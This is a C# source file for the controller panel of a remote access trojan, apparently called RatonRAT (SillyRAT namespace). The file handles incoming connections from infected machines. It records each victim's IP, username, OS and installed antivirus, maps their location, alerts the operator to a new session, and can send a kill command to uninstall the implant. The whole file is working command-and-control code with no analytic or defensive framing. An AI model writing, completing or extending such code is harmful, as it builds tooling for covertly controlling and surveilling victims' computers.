using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Net;
using System.Windows.Forms;
using GMap.NET;
using GMap.NET.WindowsForms;
using GMap.NET.WindowsForms.Markers;
using Newtonsoft.Json.Linq;
using Server.Connection;
using Stuff;
using SillyRAT;
using Newtonsoft.Json;

namespace Server.Handlers
{
    internal class HandleClient
    {
        private class BlockedList
        {
            public List<string> IP { get; set; } = new List<string>();
        }

        private static UserConfig userConfig;

        private static void LoadConfig()
        {
            string configFilePath = "Data/userConfig.json";
            if (File.Exists(configFilePath))
            {
                string json = File.ReadAllText(configFilePath);
                userConfig = JsonConvert.DeserializeObject<UserConfig>(json);
            }
            else
            {
                userConfig = new UserConfig { audioMute = false, darkMode = false, notificationMute = false };
            }
        }

        public HandleClient(SillyClient client, Unpack unpack)
        {
            LoadConfig();
            string uid = unpack.GetAsString("UID");
            string ip = unpack.GetAsString("IP");
            string port = client.tcpClient.Client.RemoteEndPoint.ToString().Split(':')[1];
            string username = unpack.GetAsString("Username");
            string os = unpack.GetAsString("Os");
            string group = unpack.GetAsString("Group");
            string country = unpack.GetAsString("Country");
            string ex = unpack.GetAsString("Executing");
            string av = unpack.GetAsString("AV");
            var coordinates = CountryLocation.GetCapitalCoordinates(country);

            if (coordinates != null)
            {
                Program.form2.Invoke(new MethodInvoker(() =>
                {
                    GMapMarker marker = new GMarkerGoogle(new PointLatLng(coordinates.Value.Lat, coordinates.Value.Lon),
                                                          GMarkerGoogleType.red);
                    marker.ToolTipText = $"{country} - {unpack.GetAsString("UID")} - {unpack.GetAsString("Username")}";
                    Program.form2.AddMarker(marker);
                }));
            }
            Program.form2.Invoke(new MethodInvoker(() =>
            {
                if (!isClient(uid))
                {
                    client.uid = uid;
                    client.listViewItem = new ListViewItem();
                    client.listViewItem.Text = ip;
                    client.listViewItem.SubItems.Add(group);
                    client.listViewItem.SubItems.Add(username);
                    client.listViewItem.SubItems.Add(uid);
                    client.listViewItem.SubItems.Add(os);
                    client.listViewItem.SubItems.Add(ex);
                    client.listViewItem.SubItems.Add(av);
                    client.listViewItem.Tag = client;
                    if (IsBlockedIP(ip))
                    {
                        Program.form2.Invoke(new MethodInvoker(() =>
                        {
                            Program.form2.AddLog($"Blocked IP detected ({ip}) • Uninstalling...", Color.LimeGreen);
                        }));
                        Pack pack = new Pack();
                        pack.Set("Packet", "Kill");
                        client.Send(pack.Pacc());
                        return;
                    }

                    if (!userConfig.notificationMute)
                    {
                        Classes.SFX.notification();
                        Program.form2.notifyIcon1.BalloonTipTitle = "RatonRAT • " + ip;
                        Program.form2.notifyIcon1.BalloonTipText = $"Started a new session with {username}\ninteract with the client on the dashboard!\nID: {uid}";
                        Program.form2.notifyIcon1.BalloonTipIcon = ToolTipIcon.Info;
                        Program.form2.notifyIcon1.ShowBalloonTip(3000);
                    }

                    Image flagImage = GetCountryFlag(country);
                    if (flagImage != null)
                    {
                        Program.form2.imageList1.Images.Add(uid, flagImage);
                        client.listViewItem.ImageKey = uid;
                    }
                    else
                    {
                        client.listViewItem.ImageKey = "noflag.png";
                    }

                    Program.form2.listView2.Items.Add(client.listViewItem);
                    foreach (ColumnHeader column in Program.form2.listView2.Columns)
                    {
                        column.Width = -2;
                    }
                }
            }));
        }

        private bool IsBlockedIP(string ip)
        {
            try
            {
                string blockedFilePath = Path.Combine(Application.StartupPath, "blocked.json");
                if (File.Exists(blockedFilePath))
                {
                    string json = File.ReadAllText(blockedFilePath);
                    var jsonObject = JsonConvert.DeserializeObject<BlockedList>(json);
                    return jsonObject.IP.Contains(ip);
                }
                return false;
            }
            catch (Exception ex)
            {
                Program.form2.AddLog($"Error reading blocked.json: {ex.Message}", Color.Red);
                return false;
            }
        }

        public bool isClient(string UID)
        {
            foreach (ListViewItem listViewItem in Program.form2.listView2.Items)
            {
                string uid = listViewItem.SubItems[Program.form2.columnHeader2.Index].Text;
                if (UID == uid)
                {
                    return true;
                }
            }
            return false;
        }

        private Image GetCountryFlag(string countryName)
        {
            try
            {
                using (WebClient wc = new WebClient())
                {
                    string apiUrl = $"https://restcountries.com/v3.1/name/{countryName}";
                    string json = wc.DownloadString(apiUrl);
                    JArray jsonArray = JArray.Parse(json);
                    string flagUrl = jsonArray[0]["flags"]["png"].ToString();
                    byte[] imageBytes = wc.DownloadData(flagUrl);
                    using (var ms = new MemoryStream(imageBytes))
                    {
                        Image originalImage = Image.FromStream(ms);
                        return ResizeImage(originalImage, 32, 32);
                    }
                }
            }
            catch (Exception)
            {
                return null;
            }
        }

        private Image ResizeImage(Image img, int width, int height)
        {
            Bitmap b = new Bitmap(width, height);
            using (Graphics g = Graphics.FromImage(b))
            {
                g.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;
                g.DrawImage(img, 0, 0, width, height);
            }
            return b;
        }

        private class UserConfig
        {
            public bool darkMode { get; set; }
            public bool audioMute { get; set; }
            public bool notificationMute { get; set; }
        }
    }
}
